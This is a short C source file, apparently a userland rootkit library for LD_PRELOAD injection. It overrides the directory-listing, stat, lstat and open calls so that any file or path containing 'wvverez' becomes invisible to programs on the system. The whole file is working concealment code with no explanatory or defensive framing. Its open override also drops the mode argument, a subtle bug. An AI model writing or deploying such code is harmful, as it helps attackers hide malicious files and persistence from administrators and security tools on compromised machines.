#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <errno.h>
#include <fcntl.h>

static int (*original_readdir_r)(DIR *dirp, struct dirent *entry, struct dirent **result) = NULL;
static struct dirent *(*original_readdir)(DIR *dirp) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, "wvverez") == 0) {
            continue;
        }
        break;
    }
    return entry;
}

int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
    if (!original_readdir_r) {
        original_readdir_r = dlsym(RTLD_NEXT, "readdir_r");
    }

    int ret;
    while ((ret = original_readdir_r(dirp, entry, result)) == 0 && *result != NULL) {
        if (strcmp((*result)->d_name, "wvverez") == 0) {
            continue;
        }
        break;
    }
    return ret;
}

int stat(const char *path, struct stat *buf) {
    int (*original_stat)(const char *, struct stat *) = dlsym(RTLD_NEXT, "stat");
    if (strstr(path, "wvverez") != NULL) {
        errno = ENOENT;
        return -1;
    }
    return original_stat(path, buf);
}

int lstat(const char *path, struct stat *buf) {
    int (*original_lstat)(const char *, struct stat *) = dlsym(RTLD_NEXT, "lstat");
    if (strstr(path, "wvverez") != NULL) {
        errno = ENOENT;
        return -1;
    }
    return original_lstat(path, buf);
}

int open(const char *pathname, int flags, ...) {
    int (*original_open)(const char *, int, ...) = dlsym(RTLD_NEXT, "open");
    if (strstr(pathname, "wvverez") != NULL) {
        // Para cualquier intento que haga de abrir algo con "wvverez"
        errno = ENOENT;
        return -1;
    }
    return original_open(pathname, flags);
}
